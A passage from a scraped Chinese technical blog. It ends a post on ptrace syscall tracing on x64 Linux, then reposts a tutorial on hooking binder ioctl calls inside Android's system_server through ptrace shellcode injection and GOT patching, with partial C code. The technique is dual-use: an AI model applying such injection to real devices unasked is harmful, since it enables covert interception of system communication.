&#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; &#125;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px"><br /></span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&nbsp; return 0;</span></span></p><p style="margin: 10px auto; padding: 0px"><span style="font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif"><span style="line-height: 21.6000003814697px">&#125;</span></span></p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px"><span style="line-height: 21.6000003814697px; font-size: 9pt">　代码执行结果：</span></p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px"> <img style="margin: 0px; padding: 0px; border: 0px" src="read-3.php-6644" tppabs="http://images.cnitblog.com/i/395724/201404/231617251708707.png" border="0" /></p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　可以看到工程目录下的文件名均被反转输出，已达到想要的效果，那么接下来解释代码中的几个关键点：</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　1，SYSCALL与orig_rax寄存器</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　不论是ia32还是ia64，orig_rax寄存器都存放着每一次系统调用的ID，为了方便开发和调试，我们可以在/usr/include/x86_64-linux-gnu/sys/syscall.h中找到系统调用的定义，比如#define SYS_write __NR_write，但是我们无法得知__NR_write具体代表的ID，进一步搜索，可以在/usr/include/x86_64-linux-gnu/asm/unistd_64.h中找到ia64下对__NR_write的定义，#define __NR_write 1，这样一来我们打印出orig_rax寄存器中的值就可以判断此时子进程正在进行何种操作了。</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　2，PTRACE_PEEKDATA与PTRACE_PEEKTEXT参数的选取</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　Linux进程的地址空间不存在独立的数据段和代码段（或叫正文段），二者位于同一空间，所以上述两个参数并无实际意义上的区别，不过为了标识我们是在读取数据段中的数据，还是使用PTRACE_PEEKDATA比较好，同理对应于PTRACE_POKEDATA和PTRACE_POKETEXT。</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　3，联合体converter</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　由于执行PTRACE_PEEKDATA操作时，返回值的二进制代表内存中的实际数据，我们可以利用&ldquo;联合体中的变量有相同的初始地址&rdquo;这一特性来帮助我们完成从二进制到字符串的转换。（这是一个做过嵌入式开发的人基本都知道的小技巧，考虑到做Android开发对这段代码可能会有疑惑，容我啰嗦两句）</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　4，数据段寻址</p><p style="margin: 10px auto; padding: 0px; font-family: verdana, 'ms song', 宋体, Arial, 微软雅黑, Helvetica, sans-serif; line-height: 21.6000003814697px">　　这是在实现x64版本时遇到的最大的困难，在getData()与setData()函数中，第二个参数表示数据在数据段中的地址，由于和ia32时寻址方式不一致，苦苦搜索几天，发现国内很多博客上的说法并不一致，最终在Intel官网上下载了Intel处理器开发手册《64-ia-32-architectures-software-developer-vol-1-manual.pdf》方才解答我的问题，寻址方式涉及两个寄存器，DS和RSI，参考手册的说法，DS表示数据段的selector，其实这个selector就是index索引的意思，由于x64下字长64bit，即8个字节，索引乘以8即得数据段在内存中的基址，RSI表示数据段内偏移地址，与基址相加即可得出数据的绝对地址，使用此地址直接访问内存就可以取出数据。</p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Nov</span>
	<span class="textbox-calendar-day">26</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6195.htm" tppabs="http://i.renjihe.com/blog/read.php?6195">Android下通过root实现对system_server中binder的ioctl调用拦截</a> <span id="starid6195"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 22:00 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6195.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6195#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6195");'>引用(0)</a> , <a href="read.php-6195.htm" tppabs="http://i.renjihe.com/blog/read.php?6195">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6195" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #333333; background-color: #f5f5f5">标 题:</span><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #000000; background-color: #f5f5f5">&nbsp;【原创】Android下通过root实现对system_server中binder的ioctl调用拦截</span><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #666666; background-color: #f5f5f5"><br /><span style="color: #333333">作 者:</span>&nbsp;<span style="color: #000000">Passion</span><br /><span style="color: #333333">时 间:</span>&nbsp;2012-10-18,13:53:53<br /><span style="color: #333333">链 接:</span>&nbsp;http://bbs.pediy.com/showthread.php?t=157419<br /></span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">Android下通过root实现对system_server中binder的ioctl调用拦截</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">作者：passion</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">2012-10-18</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">关键字：Android,&nbsp;Hook,&nbsp;API,&nbsp;Binder,&nbsp;注入,&nbsp;拦截</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">（转载请注明出处）</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">〇、引言</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;Linux下的远程注入与HOOK网上已有不少文章与代码实现，而对于Android平台，注入有不少，但HOOK却不多。经过了两个多礼拜的研究，我初步实现了在拥有root权限的Android&nbsp;2.3平台上针对system_server中binder通讯的拦截，写下来分享一下。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">一、动态链接机制</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;首先回顾一下Linux平台上，一个模块甲需要调用另外一个模块乙中的函数时的动态链接机制：</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;1、模块甲在编译期间，将要引用的模块乙的名字与函数名写入自身的符号表。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;2、运行期模块甲调用时，调用流程是从调用代码到PLT表到GOT表再跳入模块乙。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;而如何保证模块甲的代码能从其PLT/GOT跳到正确的模块乙入口，这就是链接器做的事情。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;标准Linux链接器是ld.so，支持懒绑定，也就是说，模块甲在编译期间生成的调用模块乙的原始代码，流程是从调用代码到PLT表到链接器。运行期第一次调模块乙时，首先进入链接器，链接器根据调用信息加载模块乙搜寻其符号并将找到的函数地址填入GOT表，之后的后续调用流程就直接走PLT/GOT表了。这种机制能减少加载时的开销，为Linux发行版等采用。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;Android虽然内核基于Linux，但其动态链接机制却不是ld.so而是自带的linker，不支持懒绑定。也就是说，上述模块甲乙如果在Android平台上，则是模块甲加载时，linker就会根据模块甲中的.rel.plt表和字符串表中的内容加载模块乙并搜索其所需函数地址并预先填入GOT表。之后调用流程每次都直接走PLT/GOT表，不再进linker，PLT表中也省去了跳至linker的代码，这种流程和&ldquo;勤劳&rdquo;绑定类似，倒是为拦截提供了一点方便。如果拦截懒绑定的入口时模块乙还没加载地址也没找到，拦截就没法进行了。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;要拦截模块甲对乙的调用，一般思路是通过ptrace远程注入并加载一新拦截模块至模块甲，并搜索模块甲的GOT表，找到对模块乙的调用地址，改成新模块内的某函数地址，然后新模块内的这个函数在进行了自己的处理后，再跳到模块乙中。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;Android和Linux的链接器不同导致了内存布局的差异，也导致了网上流行的Linux注入与HOOK的方法行不通。网上的方法是通过ptrace注入后，搜索dynamic的section中的PLTGOT区，去里头取link_map以遍历此进程所加载的模块来搜索需要hook的函数地址。但Android上，dynamic的section的PLTGOT区前几项都是空的，没有link_map这个数据结构，只能通过分析/proc/&lt;pid&gt;/maps来遍历模块。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">二、Binder拦截选址</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;Binder是Andorid上的轻量级跨进程通讯机制，由用户空间的libbinder.so和内核的binder驱动协作构成。一次完整的Binder调用的流程（拿对system_server中的Service的调用举例）是从用户进程到用户进程加载的libbinder.so到ioctl到binder驱动并阻塞，Service端在等待时通过libbinder.so收到驱动传上来的调用请求，把数据整好后通过libbinder.so再通过ioctl返回给驱动，之前用户端阻塞的ioctl收到应答而返回，回到libbinder.so再回到用户进程，从而完成了一次完整的调用请求。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;注意，这里用户进程空间所加载的libbinder.so和system_server端加载的libbinder.so在逻辑上不是同一个东西。正因为不是同一个东西，我们才能针对system_server进程中加载的libbinder.so动手，拦截其GOT表中对ioctl的调用，从而提前知道Service要返回的内容（如果想改，则需要分析Binder数据再改了）。这个ioctl就是拦截的选址所在。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">三、具体实现</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">======================================================================</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">3.1&nbsp;实现思路</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;在尝试了各种思路并失败了很多次后，最终确定下来拦截system_server进程中的binder通讯的思路如下：</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;1、以root身份运行注入程序，通过ptrace停止并附加system_server。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;2、远程注入shellcode，加载注入的共享库并解除附加，让其调用共享库中的一特定函数。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;3、此特定函数将库中待接替ioctl的新函数地址以及ioctl的真实地址写入Android的Property供外界使用。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;4、注入程序通过Android的Property获得ioctl的原始地址以及接替ioctl的新函数地址。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;5、注入程序再次通过ptrace附加system_server，定位libbinder.so中名为.got的Section，并搜索其项寻找ioctl的原始地址。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;6、找到GOT表中的原始地址后将其替换为接替ioctl的新函数地址。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;7、解除附加system_server让其重新运行，完成拦截。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;其中，1和2在网上有现成的实现，是一个叫LibInject的包，其中有inject.c/h以及Android.mk，还有个大牛给出的shellcode.s。不过这段shellcode加载共享库并调用后会立即dlclose卸载之，不符合我们常驻的需求，因此我又写了个新共享库让shellcode加载的共享库调用，多了一步。此库最终常驻system_server的内存。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">3.2&nbsp;注入共享库中的新函数实现</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;在这个常驻system_server进程内的共享库里，只实现了简单几个函数，其中do_hook函数在注入后通过外界调用，它不做具体的hook动作，仅仅只是把所需的两个函数地址写入Android的Property供外界使用：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;将新旧ioctl地址写入Andorid的Property供外界使用 &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;do_hook(void&nbsp;*&nbsp;param) &nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;old_ioctl&nbsp;=&nbsp;ioctl; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Ioctl&nbsp;addr:&nbsp;%p.&nbsp;New&nbsp;addr&nbsp;%p&#92;n&quot;,&nbsp;ioctl,&nbsp;new_ioctl);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;value[PROPERTY_VALUE_MAX]&nbsp;=&nbsp;&#123;'&#92;0'&#125;; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(value,&nbsp;PROPERTY_VALUE_MAX,&nbsp;&quot;%u&quot;,&nbsp;ioctl); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;property_set(PROP_OLD_IOCTL_ADDR,&nbsp;value);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(value,&nbsp;PROPERTY_VALUE_MAX,&nbsp;&quot;%u&quot;,&nbsp;new_ioctl); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;property_set(PROP_NEW_IOCTL_ADDR,&nbsp;value);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0; &nbsp;&nbsp;&nbsp;&nbsp;&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;全局变量用以保存旧的ioctl地址，其实也可直接使用ioctl &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;(*old_ioctl)&nbsp;(int&nbsp;__fd,&nbsp;unsigned&nbsp;long&nbsp;int&nbsp;__request,&nbsp;void&nbsp;*&nbsp;arg)&nbsp;=&nbsp;0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;欲接替ioctl的新函数地址，其中内部调用了老的ioctl &nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;new_ioctl&nbsp;(int&nbsp;__fd,&nbsp;unsigned&nbsp;long&nbsp;int&nbsp;__request,&nbsp;void&nbsp;*&nbsp;arg) &nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;__request&nbsp;==&nbsp;BINDER_WRITE_READ&nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call_count++;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;value[PROPERTY_VALUE_MAX]&nbsp;=&nbsp;&#123;'&#92;0'&#125;; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(value,&nbsp;PROPERTY_VALUE_MAX,&nbsp;&quot;%d&quot;,&nbsp;call_count); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;property_set(PROP_IOCTL_CALL_COUNT,&nbsp;value); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;res&nbsp;=&nbsp;(*old_ioctl)(__fd,&nbsp;__request,&nbsp;arg); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;res; &nbsp;&nbsp;&nbsp;&nbsp;&#125; </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;new_ioctl函数中，判断调用参数是否是BINDER_WRITE_READ通讯命令，是的话增加计数，并将计数写入Property，这样外界就能看见调用计数，才知道拦截成功了。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">3.3&nbsp;注入程序的搜索机制实现</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">----------------------------------------------------------------------</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;注入程序在上述第四步之后的流程是本文的核心。程序由于涉及到elf解析，还得使用linux下的elf.h。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;由于设置属性的property_set是个异步过程，因此调用共享库中的设置Property函数后，注入程序需要循环等待属性被设置上，类似于：</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;value[PROPERTY_VALUE_MAX]&nbsp;=&nbsp;&#123;'&#92;0'&#125;; &nbsp;&nbsp;&nbsp;&nbsp;do&nbsp;&#123; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(0); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;property_get(PROP_OLD_IOCTL_ADDR,&nbsp;value,&nbsp;&quot;0&quot;); &nbsp;&nbsp;&nbsp;&nbsp;&#125;&nbsp;while&nbsp;(&nbsp;strcmp(value,&nbsp;&quot;0&quot;)&nbsp;==&nbsp;0&nbsp;); &nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;old_ioctl_addr&nbsp;=&nbsp;atoi(value); </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;然后通过调用get_module_base，分析/proc/&lt;system_server的pid&gt;/maps文件，得到libbinder.so的加载基址（get_module_base也是LibInject中提供的）。</span><br /><br /><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; margin-bottom: 2px">代码:</div><pre style="margin-top: 0px; margin-bottom: 0px; padding: 6px; border: 1px inset; width: 700px; overflow: auto; background-color: #dedfdf">&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;*&nbsp;binder_addr&nbsp;=&nbsp;get_module_base(target_pid,&nbsp;BINDER_LIB_PATH); </pre></div><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;拿到新旧ioctl地址和libbinder.so基址后，就要搜索libbinder.so的GOT表，找匹配项。搜索libbinder.so既可以搜/system/lib/libbinder.so文件的内容，也可以通过ptrace的PEEKTEXT来搜system_server中被加载的libbinder.so在内存中的映像，我选择了前者，因为后者在实现时似乎有点问题，读到的Section内容不太对头，不确定是我程序问题还是被linker给改了。</span><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;&nbsp;&nbsp;&nbsp;打开/system/lib/libbinder.so文件，获取其ELF头。</span><br /><br /><span style="line-height: 19.4400005340576px; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; color: #13253c; background-color: #f5f5f5">&nbsp;</span><div style="color: #13253c; font-family: 宋体, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif; line-height: 19.4400005340576px; margin: 5px 20px 20px; background-color: #f5f5f5"><div class="smallfont" style="font-stretch: normal; line-height: normal; 